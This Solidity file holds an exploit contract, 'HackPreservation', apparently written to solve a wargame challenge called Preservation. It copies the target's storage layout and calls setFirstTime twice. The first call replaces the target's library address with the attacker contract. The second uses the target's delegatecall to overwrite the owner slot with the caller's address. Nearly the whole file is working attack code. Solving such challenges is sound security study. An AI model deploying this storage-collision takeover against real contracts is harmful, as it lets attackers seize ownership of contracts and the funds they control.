// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPreservation {
    function setFirstTime(uint _timeStamp) external;
    function setSecondTime(uint _timeStamp) external;
}

// setTimeSignature = 0x3beb26c4

contract HackPreservation {
    // Mimic storage layout of Preservation
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    uint storedTime;

    function attack(address _preservation) public {
        IPreservation preservation = IPreservation(_preservation);
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(uint256(uint160(msg.sender)));
    }

    function setTime(uint ownerAddress) public {
        owner = address(uint160(ownerAddress));
    }
}